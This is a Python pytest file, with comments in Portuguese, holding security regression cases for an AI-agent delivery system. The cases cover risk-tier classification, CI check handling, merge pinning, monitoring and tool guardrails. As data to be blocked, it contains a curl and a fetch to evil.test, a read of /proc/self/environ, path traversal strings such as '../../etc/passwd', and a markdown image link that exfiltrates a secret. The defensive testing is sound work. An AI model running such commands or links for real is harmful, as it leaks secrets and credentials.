# pyright: basic
"""Casos de regressão de segurança, tirados de falhas REAIS já corrigidas (M3 a M6).

Cada caso chama o código de produção pelo ponto de entrada e confere o RESULTADO (o tier, o
estado, a decisão do hook, o que foi mesclado), nunca um texto. `desligar` reintroduz o defeito
original por mutação (monkeypatch); o teste exige que o caso FALHE nesse caso, para provar que o
eval enxerga a proteção. Nenhum modelo é chamado: isto mede o código determinístico.
"""

from __future__ import annotations

import inspect
import re
import tempfile
from collections.abc import Awaitable, Callable
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import pytest

from forja.domain import artefatos as artefatos_mod
from forja.domain import bandas as bandas_mod
from forja.domain import politica as politica_mod
from forja.domain import revisao as revisao_mod
from forja.domain import seguranca as seguranca_mod
from forja.domain.artefatos import ArtefatoInvalido
from forja.domain.bandas import Amostra, Banda, Bandas, BandasInvalidas, EstadoDaBanda
from forja.domain.erros import ErroDeDominio
from forja.domain.guardrails import Decisao, Etapa, PoliticaDeSessao
from forja.domain.politica import Politica, Tier
from forja.domain.revisao import ArquivoDoDiff, DiffDaEntrega
from forja.infrastructure.agents import sessao_com_ferramentas as sessao_mod
from forja.infrastructure.github import cliente as cliente_mod
from forja.infrastructure.github.cliente import GitHubCliente
from forja.infrastructure.telemetry.bandas_do_operador import BandasDoOperador
from forja.infrastructure.temporal import operacao as operacao_mod
from forja.infrastructure.temporal.activities import DeliveryActivities, DeployEntrada

REPO = "acme/loja"
SHA = "a" * 40
ID = "0123456789abcdef"


@dataclass(frozen=True, slots=True)
class Caso:
    id: str
    origem: str  # a falha real que este caso protege
    executar: Callable[[], Awaitable[None]]
    desligar: Callable[[pytest.MonkeyPatch], None]
    # SHAs em que o caso FALHA (verificado contra `git archive`); vazio = invariante, nunca falhou
    falhava_em: tuple[str, ...] = ()


def _politica(altos: list[str], baixos: list[str]) -> Politica:
    return Politica.de_dict({"risk_tiers": {"high": {"paths": altos}, "low": {"paths": baixos}}})


def _cliente(rotas: dict[str, object]) -> GitHubCliente:
    """Cliente real com a rede trocada por respostas por rota (por prefixo mais longo)."""
    c = object.__new__(GitHubCliente)

    async def chamar(metodo: str, repo: str, url: str, corpo: object = None) -> object:
        if url == f"/repos/{repo}":
            return {"default_branch": "main"}
        for prefixo in sorted(rotas, key=len, reverse=True):
            if url.startswith(prefixo):
                resposta = rotas[prefixo]
                return resposta(url) if callable(resposta) else resposta
        raise RuntimeError(f"rota inesperada: {url}")  # erro do eval, não falha do grader

    c._chamar = chamar  # type: ignore[method-assign]
    return c


# --- M5: classificação de risco ------------------------------------------------------------


async def glob_de_segmento() -> None:
    p = _politica(["infra/**", "deploy/**.tf"], ["docs/**", "deploy/**"])
    assert p.classificar(["deploy/prod/main.tf"], [], 5).tier is Tier.ALTO
    assert p.classificar(["docs/a.md"], [], 5).tier is Tier.BAIXO  # o caso de agir continua agindo


def desligar_glob(mp: pytest.MonkeyPatch) -> None:
    def antigo(padrao: str, caminho: str) -> bool:  # `**` colado num segmento não cruzava `/`
        rx = re.escape(padrao).replace(r"\*\*", "[^/]*").replace(r"\*", "[^/]*")
        return re.fullmatch(rx, caminho) is not None

    mp.setattr(politica_mod, "casar_glob", antigo)


async def caminho_longo() -> None:
    p = _politica(["infra/**"], ["src/**"])
    longo = "src/" + "a/" * 200 + "auth/login.py"
    assert p.classificar([longo], [], 5).tier is Tier.ALTO
    assert p.classificar(["src/a.py"], [], 5).tier is Tier.BAIXO


def desligar_caminho_longo(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(politica_mod, "MAX_CAMINHO", 10**9)


def _classificar(p: Politica, caminhos: list[str]) -> Any:
    """`intent_id` (artefatos da própria intenção) só existe depois do fix do M5."""
    if "intent_id" in inspect.signature(p.classificar).parameters:
        return p.classificar(caminhos, [], 5, ID)
    return p.classificar(caminhos, [], 5)


async def ci_e_forja_sao_alto_risco() -> None:
    p = _politica(["infra/**"], ["docs/**", ".github/**", ".forja/**"])
    for caminho in (".github/workflows/ci.yml", ".forja/policy.yaml", ".forja/outra/spec.md"):
        assert _classificar(p, [caminho]).tier is Tier.ALTO, caminho
    assert _classificar(p, ["docs/a.md"]).tier is Tier.BAIXO


def desligar_ci_e_forja(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(Politica, "_de_um_caminho", lambda self, c, intent_id=None: (Tier.BAIXO, "docs"))


async def rename_traz_a_origem() -> None:
    p = _politica(["infra/**"], ["docs/**"])
    campos = inspect.signature(ArquivoDoDiff).parameters
    assert "anterior" in campos, "o diff não registra a origem de um rename"
    d = DiffDaEntrega((ArquivoDoDiff("docs/main.tf", "renamed", 0, 0, "", "infra/main.tf"),), SHA)
    assert p.classificar(d.caminhos, [], 0).tier is Tier.ALTO


def desligar_rename(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(
        DiffDaEntrega, "caminhos", property(lambda self: tuple(a.caminho for a in self.arquivos))
    )


async def arquivo_sem_patch_nao_e_baixo() -> None:
    p = _politica(["infra/**"], ["docs/**"])
    assert hasattr(revisao_mod, "elevar_por_diff_incompleto"), (
        "nada eleva o risco de diff incompleto"
    )
    binario = DiffDaEntrega((ArquivoDoDiff("docs/blob.bin", "added", 0, 0, ""),), SHA)
    base = p.classificar(binario.caminhos, [], 0)
    assert revisao_mod.elevar_por_diff_incompleto(base, binario).tier >= Tier.MEDIO
    inteiro = DiffDaEntrega((ArquivoDoDiff("docs/a.md", "modified", 1, 0, "+x"),), SHA)
    base = p.classificar(inteiro.caminhos, [], 1)
    assert revisao_mod.elevar_por_diff_incompleto(base, inteiro).tier is Tier.BAIXO


def desligar_sem_patch(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(revisao_mod, "elevar_por_diff_incompleto", lambda base, diff: base)


async def avanco_por_rename_nao_e_so_o_review() -> None:
    review = ".forja/x/review.md"
    assert hasattr(GitHubCliente, "avanco"), (
        "não há como saber o que a branch ganhou depois da revisão"
    )
    c = _cliente(
        {
            f"/repos/{REPO}/compare/": {
                "total_commits": 1,
                "files": [
                    {"filename": review, "status": "renamed", "previous_filename": "infra/a.tf"}
                ],
            }
        }
    )
    av = await c.avanco(REPO, "1" * 40, "2" * 40)
    assert not av.so_o_review(review)
    puro = _cliente(
        {f"/repos/{REPO}/compare/": {"total_commits": 1, "files": [{"filename": review}]}}
    )
    assert (await puro.avanco(REPO, "1" * 40, "2" * 40)).so_o_review(review)


def desligar_avanco(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(revisao_mod.AvancoDaBranch, "so_o_review", lambda self, caminho: self.commits <= 1)


async def conclusao_fora_da_allowlist_nao_e_verde() -> None:
    def rotas(conclusao: str) -> dict[str, object]:
        run = {"name": "ci", "status": "completed", "conclusion": conclusao}
        return {
            f"/repos/{REPO}/commits/{SHA}/check-runs": {"total_count": 1, "check_runs": [run]},
            f"/repos/{REPO}/commits/{SHA}/status": {
                "state": "success",
                "total_count": 0,
                "statuses": [],
            },
        }

    assert await _cliente(rotas("success")).estado_dos_checks(REPO, SHA) == "verde"
    for ruim in ("startup_failure", "stale", "algo_novo"):
        assert await _cliente(rotas(ruim)).estado_dos_checks(REPO, SHA) == "falhou", ruim


def desligar_allowlist(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(
        cliente_mod,
        "CONCLUSOES_VERDES",
        frozenset({"success", "neutral", "skipped", "startup_failure", "stale", "algo_novo"}),
    )


async def status_31_falhou_na_segunda_pagina() -> None:
    ok = {"name": "ci", "status": "completed", "conclusion": "success"}

    def status(url: str) -> object:
        if "page=2" in url:
            return {"state": "success", "total_count": 31, "statuses": [{"state": "failure"}]}
        return {"state": "success", "total_count": 31, "statuses": [{"state": "success"}] * 30}

    c = _cliente(
        {
            f"/repos/{REPO}/commits/{SHA}/check-runs": {"total_count": 1, "check_runs": [ok]},
            f"/repos/{REPO}/commits/{SHA}/status": status,
        }
    )
    assert await c.estado_dos_checks(REPO, SHA) == "falhou"


def desligar_paginacao(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(cliente_mod, "MAX_PAGINAS_DE_CHECKS", 0)  # não lê página nenhuma


async def merge_so_do_sha_revisado() -> None:
    from tests.infrastructure.temporal.fakes import ExecutorFalso, pilha_de_revisao

    _, leitura, escrita = pilha_de_revisao()
    leitura.pontas = ["b" * 40]  # a branch andou depois da revisão do SHA "a..."
    ativ = DeliveryActivities(ExecutorFalso(), leitura=leitura, escrita=escrita)
    r = await ativ.mesclar(DeployEntrada(REPO, ID, "x", SHA))
    assert r == "andou" and escrita.merges == []
    leitura.pontas = [SHA]  # mesma ponta: o merge acontece
    assert await ativ.mesclar(DeployEntrada(REPO, ID, "x", SHA)) == "publicado"
    assert escrita.merges == [7]


def desligar_pin_de_sha(mp: pytest.MonkeyPatch) -> None:
    async def nunca_andou(self: object, e: object) -> bool:
        return False

    mp.setattr(DeliveryActivities, "_branch_andou", nunca_andou)


# --- M6: falhar fechado --------------------------------------------------------------------


async def sem_dado_nao_e_saudavel() -> None:
    from temporalio.testing import ActivityEnvironment

    class Fonte:
        async def bandas(self, repositorio: str) -> Bandas | None:
            return Bandas.de_dict(
                {"service": "s", "bands": [{"id": "lat", "query": "q", "max": 0.3, "for": "5m"}]}
            )

        async def deploys_recentes(self, repositorio: str) -> list[str]:
            return []

    class Vazia:
        async def serie(self, consulta: str, janela: int, passo: int, fim: float) -> list[Amostra]:
            return []

    ativ = _atividades(Fonte(), Vazia())
    (r,) = await ActivityEnvironment().run(ativ.checar_bandas, REPO)
    assert r.estado == EstadoDaBanda.SEM_DADOS
    nan = [Amostra(1000.0 - 60 * i, float("nan")) for i in range(11)]
    assert (
        bandas_mod.avaliar_banda(Banda("lat", "q", 0.3, 300), nan, 1000.0, 60)[0]
        is EstadoDaBanda.SEM_DADOS
    )


def desligar_sem_dados(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(operacao_mod, "avaliar_banda", lambda *a, **k: (EstadoDaBanda.DENTRO, ""))
    mp.setattr(bandas_mod, "avaliar_banda", lambda *a, **k: (EstadoDaBanda.DENTRO, ""))


async def max_nao_finito_e_recusado() -> None:
    for valor in (float("nan"), float("inf")):
        try:
            Banda("a", "q", valor, 300)
        except BandasInvalidas:
            continue
        raise AssertionError(f"aceitou max={valor}")


def desligar_max_finito(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(bandas_mod.math, "isfinite", lambda x: True)


async def monitor_reconfere_a_lista_do_operador() -> None:
    from temporalio.testing import ActivityEnvironment

    assert "repositorios" in inspect.signature(operacao_mod.AtividadesDeOperacao).parameters, (
        "o monitor não tem a lista do operador para reconferir"
    )
    ativ = _atividades(_FonteComUmaBanda(), _SemSerie(), frozenset({"acme/outro"}))
    resultado = await ActivityEnvironment().run(ativ.checar_bandas, REPO)
    assert resultado and str(resultado[0].estado) == "desativado", "seguiu monitorando"


def desligar_lista_do_operador(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(operacao_mod.AtividadesDeOperacao, "_permitido", lambda self, repo: True)


# --- M6: defeitos reais que escaparam (08909c6) -------------------------------------------------


def _atividades(
    fonte: object, metricas: object = None, repos: frozenset[str] | None = None
) -> operacao_mod.AtividadesDeOperacao:
    """Instancia nos dois SHAs: a lista do operador (`repositorios`) só existe depois do fix."""
    parametros = inspect.signature(operacao_mod.AtividadesDeOperacao).parameters
    args: list[object] = [fonte, metricas, None, None]
    if "repositorios" in parametros:
        args.append(repos if repos is not None else frozenset({REPO}))
    return operacao_mod.AtividadesDeOperacao(*args)  # type: ignore[arg-type]


class _FonteDoOperador:
    def __init__(self, pasta: Path) -> None:
        self._bandas = BandasDoOperador(pasta)

    async def bandas(self, repositorio: str) -> Bandas | None:
        return await self._bandas.bandas(repositorio)

    async def deploys_recentes(self, repositorio: str) -> list[str]:
        return []


class _FonteComUmaBanda:
    async def bandas(self, repositorio: str) -> Bandas | None:
        return Bandas.de_dict(
            {"service": "s", "bands": [{"id": "lat", "query": "q", "max": 0.3, "for": "5m"}]}
        )

    async def deploys_recentes(self, repositorio: str) -> list[str]:
        return []


class _SemSerie:
    async def serie(self, *args: object) -> list[Amostra]:
        return []


async def _checar(conteudo: bytes | None) -> list[Any]:
    """O que `checar_bandas` devolve para um repositório monitorado com este arquivo do operador.
    Exceção da produção vira falha do grader (o monitor cairia), não erro do eval."""
    from temporalio.testing import ActivityEnvironment

    with tempfile.TemporaryDirectory() as pasta:
        if conteudo is not None:
            (Path(pasta) / "acme__loja.yaml").write_bytes(conteudo)
        ativ = _atividades(_FonteDoOperador(Path(pasta)), _SemSerie())
        try:
            return await ActivityEnvironment().run(ativ.checar_bandas, REPO)
        except (ErroDeDominio, ValueError, OSError) as erro:
            raise AssertionError(
                f"a produção levantou {type(erro).__name__}: o monitor cairia"
            ) from erro


def _sem_dados_unico(resultado: list[Any]) -> None:
    assert len(resultado) == 1, f"devolveu {len(resultado)} verificações: parece saudável"
    assert str(getattr(resultado[0], "estado", "")) == "sem_dados"


async def bandas_ausentes_ou_vazias_sao_sem_dados() -> None:
    _sem_dados_unico(await _checar(None))  # arquivo ausente: nunca `[]`
    _sem_dados_unico(await _checar(b"service: s\nbands: []\n"))  # `bands: []`


async def bandas_ilegiveis_sao_sem_dados_sem_excecao() -> None:
    _sem_dados_unico(await _checar(b"service: [\n  x: : :\n"))  # YAML quebrado
    _sem_dados_unico(await _checar(b"service: \xff\xfe\n"))  # não UTF-8


def desligar_tolerancia_a_bandas(mp: pytest.MonkeyPatch) -> None:
    async def antigo(self: object, repositorio: str) -> list[object]:
        bandas = await self._bandas.bandas(repositorio)  # type: ignore[attr-defined]  # sem try
        if bandas is None or not bandas.bandas:
            return []
        return [operacao_mod.VerificacaoDto(b.id, "dentro") for b in bandas.bandas]

    mp.setattr(operacao_mod.AtividadesDeOperacao, "checar_bandas", antigo)


async def for_de_2m_com_60s_acima_nao_viola() -> None:
    dois = Banda("b", "q", 5, 120)
    s = [Amostra(1000.0 - 60 * (4 - i), v) for i, v in enumerate([1, 1, 1, 9, 9])]
    estado = bandas_mod.avaliar_banda(dois, s, 1000.2, 60)[0]
    assert estado is EstadoDaBanda.DENTRO, (
        f"deu {estado}: só 60 s acima do teto de uma janela de 120 s"
    )


def desligar_janela_do_for(mp: pytest.MonkeyPatch) -> None:
    def antigo(
        banda: Banda, serie: list[Amostra], agora: float, passo: int
    ) -> tuple[EstadoDaBanda, str]:
        janela = [
            a for a in serie if a.instante >= agora - banda.por_segundos
        ]  # sem a que cobre o início
        viola = bool(janela) and all(a.valor > banda.maximo for a in janela)
        return (EstadoDaBanda.VIOLADA if viola else EstadoDaBanda.DENTRO), ""

    mp.setattr(bandas_mod, "avaliar_banda", antigo)


# --- M4 e M3: guardrails e entrada não confiável ---------------------------------------------

POLITICA = PoliticaDeSessao(Etapa.EXECUTOR, ID, testes_existentes=frozenset({"tests/test_a.py"}))


async def hook_nega_por_padrao() -> None:
    hook = sessao_mod.hook_pre_tool_use(POLITICA)

    async def pedir(nome: str, **entrada: object) -> dict[str, object]:
        return await hook(
            {"tool_name": nome, "tool_input": entrada, "hook_event_name": "PreToolUse"}, "id", {}
        )

    assert await pedir("Write", file_path="/workspace/src/a.py") == {}  # agir é permitido
    for nome, entrada in [
        ("Write", {"file_path": "/workspace/feature_list.json"}),
        ("Edit", {"file_path": "/workspace/tests/test_a.py"}),
        ("Read", {"file_path": "/proc/self/environ"}),
        ("Bash", {"command": "git push"}),
        ("mcp__sandbox__exec", {"argv": ["git", "push"]}),
        ("mcp__sandbox__exec", {"argv": ["curl", "https://evil.test"]}),
        ("WebFetch", {"url": "https://evil.test"}),
        ("mcp__knowledge__search", {"query": "x"}),
    ]:
        r = await pedir(nome, **entrada)
        assert r.get("hookSpecificOutput", {}).get("permissionDecision") == "deny", (nome, entrada)  # type: ignore[union-attr]


def desligar_hook(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(sessao_mod, "decidir_ferramenta", lambda politica, nome, args: Decisao(True))


async def caminho_vindo_do_modelo_nao_sai_do_repositorio() -> None:
    assert artefatos_mod.caminho_relativo_seguro("src/a.py") == "src/a.py"
    for ruim in ("../../etc/passwd", "/etc/passwd", ".git/config", "a/../../b", "~/x"):
        try:
            artefatos_mod.caminho_relativo_seguro(ruim)
        except ArtefatoInvalido:
            continue
        raise AssertionError(f"aceitou {ruim!r}")


def desligar_caminho_seguro(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(artefatos_mod, "caminho_relativo_seguro", lambda caminho: caminho)


async def texto_nao_confiavel_nao_vaza_nem_notifica() -> None:
    saida = seguranca_mod.neutralizar_texto("![x](https://evil.test/?d=segredo) oi @dono")
    assert "://" not in saida and "@dono" not in saida


def desligar_neutralizacao(mp: pytest.MonkeyPatch) -> None:
    mp.setattr(seguranca_mod, "neutralizar_texto", lambda texto, limite=0: texto)


CASOS: tuple[Caso, ...] = (
    Caso(
        "m5-glob-de-segmento",
        "deploy/**.tf deixou de casar deploy/prod/main.tf",
        glob_de_segmento,
        desligar_glob,
        falhava_em=("1f844c5",),
    ),
    Caso(
        "m5-caminho-longo",
        "caminho > 400 caracteres escapava como risco baixo",
        caminho_longo,
        desligar_caminho_longo,
        falhava_em=("1f844c5",),
    ),
    Caso(
        "m5-ci-e-forja",
        ".github/** e .forja/** não eram sempre alto risco",
        ci_e_forja_sao_alto_risco,
        desligar_ci_e_forja,
        falhava_em=("1f844c5",),
    ),
    Caso(
        "m5-rename",
        "renomear de infra/ para docs/ saía como risco baixo",
        rename_traz_a_origem,
        desligar_rename,
        falhava_em=("1f844c5",),
    ),
    Caso(
        "m5-sem-patch",
        "binário sem patch saía como risco baixo",
        arquivo_sem_patch_nao_e_baixo,
        desligar_sem_patch,
        falhava_em=("1f844c5", "142305f"),
    ),
    Caso(
        "m5-avanco-rename",
        "rename para o review.md passava como só o review",
        avanco_por_rename_nao_e_so_o_review,
        desligar_avanco,
        falhava_em=("1f844c5", "142305f"),
    ),
    Caso(
        "m5-allowlist-de-checks",
        "startup_failure e stale contavam como verde",
        conclusao_fora_da_allowlist_nao_e_verde,
        desligar_allowlist,
        falhava_em=("1f844c5",),
    ),
    Caso(
        "m5-statuses-paginados",
        "o 31º commit status falhava e saía verde",
        status_31_falhou_na_segunda_pagina,
        desligar_paginacao,
        falhava_em=("1f844c5", "142305f"),
    ),
    Caso(
        "m5-sha-fixado",
        "o merge usava a ponta atual, não o SHA revisado",
        merge_so_do_sha_revisado,
        desligar_pin_de_sha,
        falhava_em=("1f844c5",),
    ),
    Caso(
        "m6-sem-dados",
        "invariante (não foi o defeito real do M6): série vazia ou NaN é sem dados",
        sem_dado_nao_e_saudavel,
        desligar_sem_dados,
    ),
    Caso(
        "m6-bandas-ausentes",
        "bandas ausentes ou `bands: []` devolviam lista vazia (parecia saudável)",
        bandas_ausentes_ou_vazias_sao_sem_dados,
        desligar_tolerancia_a_bandas,
        falhava_em=("08909c6",),
    ),
    Caso(
        "m6-bandas-ilegiveis",
        "YAML quebrado ou não UTF-8 derrubava o monitor",
        bandas_ilegiveis_sao_sem_dados_sem_excecao,
        desligar_tolerancia_a_bandas,
        falhava_em=("08909c6",),
    ),
    Caso(
        "m6-janela-for",
        "`for: 2m` com só 60 s acima do teto dava violada",
        for_de_2m_com_60s_acima_nao_viola,
        desligar_janela_do_for,
        falhava_em=("08909c6",),
    ),
    Caso(
        "m6-max-nao-finito",
        "max NaN ou infinito dava 'dentro'",
        max_nao_finito_e_recusado,
        desligar_max_finito,
        falhava_em=("08909c6",),
    ),
    Caso(
        "m6-lista-do-operador",
        "repo removido do monitor seguia abrindo issue",
        monitor_reconfere_a_lista_do_operador,
        desligar_lista_do_operador,
        falhava_em=("08909c6",),
    ),
    Caso(
        "m4-hook-nega-por-padrao",
        "ferramentas e caminhos fora da allowlist do executor",
        hook_nega_por_padrao,
        desligar_hook,
    ),
    Caso(
        "m3-caminho-do-modelo",
        "caminho vindo de modelo ou arquivo do repo",
        caminho_vindo_do_modelo_nao_sai_do_repositorio,
        desligar_caminho_seguro,
    ),
    Caso(
        "m3-saida-nao-confiavel",
        "imagem/link markdown exfiltrava dados e menção notificava",
        texto_nao_confiavel_nao_vaza_nem_notifica,
        desligar_neutralizacao,
    ),
)
